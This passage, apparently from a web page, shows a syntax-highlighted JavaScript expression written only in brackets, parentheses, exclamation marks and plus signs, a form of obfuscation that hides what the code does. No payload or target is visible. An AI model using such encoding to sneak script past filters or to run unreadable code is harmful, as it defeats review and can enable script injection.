punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token operator\">!</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token 